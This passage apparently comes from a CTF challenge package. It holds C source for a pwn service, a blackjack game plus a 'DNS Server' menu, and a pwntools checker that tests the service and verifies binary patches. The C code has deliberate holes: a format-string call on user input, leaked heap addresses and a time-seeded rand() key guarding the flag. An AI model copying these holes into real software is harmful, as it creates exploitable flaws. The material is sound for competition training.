(choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; // system("clear"); asktitle(); &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes &#123; // system("clear"); printf("\n I told you so.\n"); asktitle(); &#125; return;&#125; // End function int clubcard() //Displays Club Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| %d |\n", k); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| J |\n"); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| A |\n"); printf("| %c|\n", club); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| Q |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| K |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; return k; &#125;// End function int diamondcard() //Displays Diamond Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| %d |\n", k); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| J |\n"); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| A |\n"); printf("| %c|\n", diamond); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| Q |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| K |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125;// End function int heartcard() //Displays Heart Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| %d |\n", k); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| J |\n"); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| A |\n"); printf("| %c|\n", heart); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| Q |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| K |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int spadecard() //Displays Spade Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| %d |\n", k); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| J |\n"); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| A |\n"); printf("| %c|\n", spade); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| Q |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| K |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int randcard() //Generates random card&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function random_card = rand()%4+1; if(random_card==1) &#123; clubcard(); l=k; &#125; if(random_card==2) &#123; diamondcard(); l=k; &#125; if(random_card==3) &#123; heartcard(); l=k; &#125; if(random_card==4) &#123; spadecard(); l=k; &#125; return l;&#125; // End Function void play() //Plays game&#123; int p=0; // holds value of player_total int i=1; // counter for asking user to hold or stay (aka game turns) char choice3; player_total=0; dealer_total=0; cash = cash; cash_test(); printf("\nCash: $%d\n",cash); //Prints amount of cash user has randcard(); //Generates random card player_total = p + l; //Computes player total p = player_total; printf("\nYour Total is %d\n", p); //Prints player total dealer(); //Computes and prints dealer total betting(); //Prompts user to enter bet amount while(i&lt;=21) //While loop used to keep asking user to hit or stay at most twenty-one times // because there is a chance user can generate twenty-one consecutive 1's &#123; if(p==21) //If user total is 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&gt;21) //If player total is over 21, loss &#123; printf("\nWoah Buddy, You Went WAY over.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&lt;=21) //If player total is less than 21, ask to hit or stay &#123; printf("\n\nWould You Like to Hit or Stay?"); scanf("%c", &amp;choice3); while((choice3!='H') &amp;&amp; (choice3!='h') &amp;&amp; (choice3!='S') &amp;&amp; (choice3!='s')) // If invalid choice entered &#123; printf("\n"); printf("Please Enter H to Hit or S to Stay.\n"); scanf("%c",&amp;choice3); &#125; if((choice3=='H') || (choice3=='h')) // If Hit, continues &#123; randcard(); player_total = p + l; p = player_total; printf("\nYour Total is %d\n", p); dealer(); if(dealer_total==21) //Is dealer total is 21, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer total is over 21, win &#123; printf("\nDealer Has Went Over!. You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; if((choice3=='S') || (choice3=='s')) // If Stay, does not continue &#123; printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total); stay(); &#125; &#125; i++; //While player total and dealer total are less than 21, re-do while loop &#125; // End While Loop&#125; // End Function void dealer() //Function to play for dealer AI&#123; int z; if(dealer_total&lt;17) &#123; // srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function z=rand()%13+1; if(z&lt;=10) //If random number generated is 10 or less, keep that value &#123; d=z; &#125; if(z&gt;11) //If random number generated is more than 11, change value to 10 &#123; d=10; &#125; if(z==11) //If random number is 11(Ace), change value to 11 or 1 depending on dealer total &#123; if(dealer_total&lt;=10) &#123; d=11; &#125; else &#123; d=1; &#125; &#125; dealer_total = dealer_total + d; &#125; printf("\nThe Dealer Has a Total of %d", dealer_total); //Prints dealer total &#125; // End Function void stay() //Function for when user selects 'Stay'&#123; dealer(); //If stay selected, dealer continues going if(dealer_total&gt;=17) &#123; if(player_total&gt;=dealer_total) //If player's total is more than dealer's total, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer's total is more than 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(player_total&lt;dealer_total) //If player's total is less than dealer's total, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; else &#123; stay(); &#125; &#125; // End Function void cash_test() //Test for if user has cash remaining in purse&#123; if (cash &lt;= 0) //Once user has zero remaining cash, game ends and prompts user to play again &#123; printf("You Are Bankrupt. Game Over"); //cash = 500; exit(0); //askover(); &#125; if(cash&gt;=WIN_SUM)&#123; int id; int length; char buffer[100]; char *key=0; id = open("/home/tsctf/flag/flag",O_RDONLY,S_IRUSR ); if(id &lt;0)&#123; printf("flag file error~!\n"); exit(0); &#125; length = read(id,buffer,100); if (length&lt;0)&#123; printf("read error~!\n"); exit(0); &#125; buffer[length] = '\0'; length = strlen(buffer); key = malloc(length); for(int i =0 ; i&lt;length;i++)&#123; //printf("%d ",key[i*4]); key[i]=(rand()%256); &#125; //printf("%d",(length/4)*4); for(int i = 0;i&lt;length;i++)&#123; //printf("%2x",key[i]); buffer[i] = buffer[i]^key[i]; &#125; puts("d(`･∀･)b :"); puts(" OK, you win,"); puts("I won't give u real flag :"); write(1,buffer,length); close(id); exit(0); &#125;&#125; // End Function int betting() //Asks user amount to bet&#123; printf("\n\nEnter Bet: $"); scanf("%u", &amp;bet); while ((bet &gt; cash) || (bet == 0))//If player tries to bet more money than player has &#123; printf("\nAre you kidding me? "); printf("\nEnter Bet: "); scanf("%u", &amp;bet); //return bet; &#125;return bet;&#125; // End Function void askover() // Function for asking player if they want to play again&#123; char choice1; printf("\nWould You Like To Play Again?"); printf("\nPlease Enter Y for Yes or N for No\n"); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. &#123; // system("clear"); play(); &#125; else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; //fileresults(); printf("\nBYE!!!!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void fileresults() //Prints results into Blackjack.txt file in program directory&#123; FILE *fpresults; //File pointer is fpresults fpresults = fopen(RESULTS, "w"); //Creates file and writes into it if(fpresults == NULL) // what to do if file missing from directory &#123; printf("\nError: File Missing\n"); //system("pause"); exit(1); &#125; else &#123; fprintf(fpresults,"\n\t RESULTS"); fprintf(fpresults,"\n\t---------\n"); fprintf(fpresults,"\nYou Have Won %d Times\n", won); fprintf(fpresults,"\nYou Have Lost %d Times\n", loss); fprintf(fpresults,"\nKeep Playing and Set an All-Time Record!"); &#125; fclose(fpresults); return;&#125; // End Functionvoid handler()&#123; puts("[-] Time out ... \n"); exit(1);&#125;void init() &#123; char *logo = "*******************************************\n" "* _____ _____ _____ _____ _____ *\n" "* |_ _| / ___/ / ___| |_ _| | ___| *\n" "* | | | |___ | | | | | |__ *\n" "* | | \\___ \\ | | | | | __| *\n" "* | | ___| | | |___ | | | | *\n" "* |_| /_____/ \\_____| |_| |_| *\n" "* *\n" "* ------ Welcome to TSCTF FINAL --------- *\n" "* ------ Have a nice day --------- *\n" "* _____ _ __ _ ___ _ *\n" "* | ___| | | | \\ | | / | | | *\n" "* | |__ | | | \\| | / /| | | | *\n" "* | __| | | | |\\ | / / | | | | *\n" "* | | | | | | \\ | / / | | | |___ *\n" "* |_| |_| |_| \\_| /_/ |_| |_____| *\n" "*******************************************\n" "\n"; puts(logo); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr,0,2,0); signal(14,handler); alarm(200); srand((unsigned) time(NULL)/60); visitor_name = malloc(8); strcpy(visitor_name,"anonym");&#125;void menu()&#123; puts("==GOD.ZE DNS Server=="); puts("1. Login"); puts("2. Add a DNS item"); puts("3. Parsing domain names "); puts("4. Delete DNS item"); puts("5. Exit"); puts("=====================");&#125;void menu1()&#123; puts("=====MENU======"); puts("1. set name"); puts("2. set motto"); puts("3. show motto"); puts("4. Exit"); puts("===============");&#125;void maybe_real_set_name()&#123; scanf("%7s",visitor_name); puts("OK, I know your name :"); printf(visitor_name);&#125;void set_name()&#123; maybe_real_set_name();&#125;void set_motto()&#123; char buffer[0x200] ; read_n(buffer,0x200); motto = strdup(buffer);&#125;int login()&#123; if (login_flag != 0) return -1; char * fmt = "%d"; int opt; while(1)&#123; printf("&gt;"); if(scanf(fmt,&amp;opt)&lt;=0)&#123; exit(0); &#125; switch(opt)&#123; case 1: if((login_flag &amp; 0x01)==0)&#123; login_flag = login_flag|0x01; printf("name:"); set_name(); &#125; break; case 2: if((login_flag &amp;0x10) == 0)&#123; login_flag = login_flag|0x10; printf("motto:"); set_motto(); &#125; break; case 3: if((login_flag &amp;0x100) == 0)&#123; login_flag = login_flag|0x100; if(motto!=0) puts(motto); &#125; break; case 4: return 0; break; default: puts("invalid options\n"); &#125; &#125;&#125;int read_n(char *src,int len)&#123; unsigned int i; for ( i = 0; i &lt; len; i++ ) &#123; if ( read(0, (void *)(i + src), 1) != 1 ) exit(-1); if ( *(src+i) == 10 ) &#123; *(src+i) = 0; return i; &#125; &#125; return i; &#125;int read_int()&#123; char nptr[16]; read_n(nptr, 0xA); return (unsigned int)atoi(nptr);&#125;int check_format(char *ip)&#123; int num =0; for(int i=0;i&lt;0x20;i++)&#123; if(ip[i]=='.')&#123; num += 1; &#125; &#125; if(num!=3)&#123; return -1; &#125; return 0;&#125;void add_DNS()&#123; struct DNS_Node * tmp; unsigned int len,i; char *remark; for ( i = 0; i &lt;= 31 &amp;&amp; DNS_Node_List[i]; ++i ) ; if ( i == 32 ) return 0xFFFFFFFFLL; tmp = malloc(sizeof(struct DNS_Node)); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned int)tmp&amp;0xfff)); strcpy(tmp-&gt;user,visitor_name); printf("input domain: "); read_n(tmp-&gt;domain,0x30); printf("input length:"); len =read_int(); remark = malloc(len+0x20); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned)remark&amp;0xfff)); tmp-&gt;ptr = remark; printf("input remark:"); read_n(remark+0x20,len); printf("input IP:"); read_n(remark,0x20); if(check_format(remark)!=0)&#123; printf("error input,bye!\n"); exit(0); &#125; DNS_Node_List[i]=tmp; printf("Complete\n");&#125;void parse_domain()&#123; char domain[0x30]; struct DNS_Node *tmp=0; int i; printf("Give me ur domain:"); read_n(domain,0x30); for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) ) &#123; tmp = DNS_Node_List[i]; printf("adder : %s\n",tmp-&gt;user ); printf("IP : %s\n",tmp-&gt;ptr ); printf("remark: %s\n",(tmp-&gt;ptr + 0x20)); printf("---------------------------\n"); &#125; &#125; if ( !tmp ) puts("not find!!"); &#125;void delete_DNS()&#123; char domain[0x30]; struct DNS_Node *tmp; int i,zero,j; printf("Give me bad domain:"); read_n(domain,0x30); zero = 0; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !strcmp(visitor_name,DNS_Node_List[i]-&gt;user) ) &#123; zero = 1; tmp = DNS_Node_List[i]; j=i; free(tmp-&gt;ptr); free(tmp); &#125; &#125; if(zero)&#123; DNS_Node_List[j]=0; printf("complete\n" ); &#125; else&#123; puts("not find!!"); &#125;&#125;void main()&#123; asm( "shr $0x16,%rsp\n" "shl $0x16,%rsp\n" "xor $0x188,%rsp\n" "push %rbp\n" "mov %rsp,%rbp\n" "sub $0x20,%rsp\n" ); int option; init(); //menu(); while(1)&#123; menu(); printf("&gt;"); if(scanf("%u",&amp;option)&lt;=0)&#123; exit(0); &#125; switch(option)&#123; case 1: menu1(); login(); break; case 2: add_DNS(); break; case 3: parse_domain(); break; case 4: delete_DNS(); break; case 5: puts("=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"); puts(" [Don't leave me alone, I can give u sh311 !]"); puts(" "); exit(0); break; case 0xbabe: game(); break; &#125; //login(); //game(); &#125;&#125;/*NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)CONTENT -&gt; DNS(0X20) + CONTENT(~)*/c Checkerusr/bin/env python# coding=utf-8from pwn import *import randomimport threadimport stringimport hashlibimport requestsimport osfrom termcolor import *import jsonimport timecoding_check_level = 1fmt_check_level = 0log_file = 'note_check'debug = 0check = Falsefile_path = '/home/tsctf/binary/pwn'#/Desktop/DNS_Server'if debug: round_time = 300 slog = 1else: round_time = 300 slog = 0class TimeoutError(Exception): def __init__(self, err='timeout'): Exception.__init__(self, err)class ResponseError(Exception): def __init__(self, err='ErrResponse'): Exception.__init__(self, err)class Checker: """ function checker for Question Note """ def __init__(self, _rhost, _port, _timeout): # pwntools init global context global slog context.log_level = 'ERROR' if slog: context.log_level = 'DEBUG' if _timeout: context.timeout = _timeout # check result init self.state = 0 # local variables init self.rhost = remote(_rhost, _port) self.name = '' self.oip = _rhost self.oport = _port def randstr(self, length=10): # generate random string with lowercase result = '' space = string.lowercase for i in range(length): index = random.randint(0, len(space) - 1) result += space[index] return result def md5(self, inputstr): return hashlib.md5(inputstr).hexdigest() def check_login(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') recv = self.rhost.recvuntil("&gt;") if name not in recv: print_log(colored('[Error] in login_set_name : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError if ((name+'\n') in recv)&amp;(fmt_check_level!=0): print_log(colored('[Error] bad patch format vul : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.sendline('2') self.rhost.recvuntil('motto:') motto = self.randstr(0x200) self.rhost.send(motto) self.rhost.recvuntil('&gt;') self.rhost.sendline('3') if motto not in self.rhost.recvuntil("&gt;"): print_log(colored('[Error] in login_show_motto : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def add(self,domain,length,remark,ip): self.rhost.recvuntil('&gt;') self.rhost.sendline('2') self.rhost.recvuntil("domain:") #domain_2 = self.randstr(0x30) self.rhost.sendline(domain) self.rhost.recvuntil("length:") self.rhost.sendline(str(length)) self.rhost.recvuntil("remark:") #remark_2 = self.randstr(0x90) self.rhost.sendline(remark) self.rhost.recvuntil("input IP:") self.rhost.sendline(ip) def delete(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('4') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def parse(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('3') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def check_DNS(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') self.rhost.recvuntil("&gt;") self.rhost.sendline('4') # add domain_1 = self.randstr(0x30-1) domain_2 = self.randstr(0x30-1) remark_1 = self.randstr(0x50-1) remark_2 = self.randstr(0x90-1) remark_3 = self.randstr(0x110-1) self.add(domain_1,0x50,remark_1,"127.0.0.1") self.add(domain_1,0x90,remark_2,"127.0.0.1") self.add(domain_2,0x110,remark_3,"0.0.0.0") self.parse(domain_1) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_1 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_2 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.parse(domain_2) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "0.0.0.0" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_3 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.delete(domain_2) self.parse(domain_2) if "not find!!" not in self.rhost.recvuntil("==GOD"): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def get_num(self): self.rhost.recvuntil('Your Total is ') return int(self.rhost.recvline()[:-1]) def get_money(self): self.rhost.recvuntil("Cash: $") return int(self.rhost.recvline()[:-1]) def round(self): self.money = self.get_money() if (self.money!= self.pre_money): print_log(colored('[Error] in game : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("Bet: $") self.rhost.sendline('1') self.rhost.recvuntil('Please Enter H to Hit or S to Stay.') self.rhost.sendline('H') while (1): num = self.get_num() tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; loss_num: self.loss = loss_num return -1 else: tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; loss_num: self.loss = loss_num return -1 def check_game(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.win = 0 self.loss = 0 self.money = 5 self.pre_money = 5 self.rhost.sendline(str(0xbabe)) self.rhost.recvuntil("(Y/N)") self.rhost.sendline("y") self.rhost.recvuntil("Choice:") self.rhost.sendline("1") for i in range(3): self.pre_money += self.round() self.rhost.sendline('y') def check_heap(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline('2') self.rhost.recvuntil("[") addr_1 = int(self.rhost.recvuntil(']')[:-1],16) self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_2 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_2-addr_1)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 1 self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3-addr_2)!=0x80: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("dubhe") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x110)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_4-addr_3)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 2 self.delete("p4nda") self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3!=addr_1): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_2!=addr_4): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") def function_check(self): try: self.check_login() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_DNS() #self.rhost.close() #self.rhost = remote(self.oip, self.oport) #self.check_game() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_heap() self.rhost.close() except Exception as e: print e try: self.rhost.close() except Exception as e: pass self.state = 1 def getResult(self): return self.statedef check(ip, port): """ function: check workstate with single ip :return: check result format &#123;'ip': "127.0.0.1", 'status', 0&#125; 0 stands for normal and 1 stands for down """ try: checker = Checker(ip, port, 10) checker.function_check() return checker.getResult() except Exception as e: if debug: print e if 'invalid literal for int() with base 10:' in e : return 0 return 1def upload(check_server, payload): #print payload r = requests.post(check_server, data=payload) print r.textdef log(filename, str): f = open(filename + ".log", 'ab') f.write(str) f.close()def print_log(info,ip=""): print info log(log_file, info + "\n") if ip!="": if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') log('./checkresult/'+ip+'.log','['+time.asctime( time.localtime(time.time()) )+'] '+ info + "\n")def CalcMD5(filepath): with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() #print(hash) return hashdef patch_check(file_path,standard,oip): #print "in" f = open(file_path,"rb") f_standard = open(standard,'rb')#main 0x3370 - 0x325a f.seek(0x325a,0) f_standard.seek(0x325a,0) standard_tmp = f_standard.read(0x3370-0x325a) md5obj = hashlib.md5() tmp = f.read(0x3370-0x325a) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch main : ' + oip + '\n', 'red'),ip=oip) return 0 # init 0x29D6 0x2AB6 f.seek(0x29D6,0) f_standard.seek(0x29D6,0) standard_tmp = f_standard.read(0x2AB6-0x29D6) md5obj = hashlib.md5() tmp = f.read(0x2AB6-0x29D6) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch init : ' + oip + '\n', 'red'),ip=oip) return 0 # menu 0x2AB7 0x2b03 f.seek(0x2AB7,0) f_standard.seek(0x2AB7,0) standard_tmp = f_standard.read(0x2b03-0x2AB7) md5obj = hashlib.md5() tmp = f.read(0x2b03-0x2AB7) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch menu : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x4412,0) flag_str =f.read(22) #print flag_str if flag_str !='/home/tsctf/flag/flag\0': f.close() print_log(colored('[Error] in game-&gt;patch flag path : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x1273,0) f_standard.seek(0x1273,0) standard_tmp = 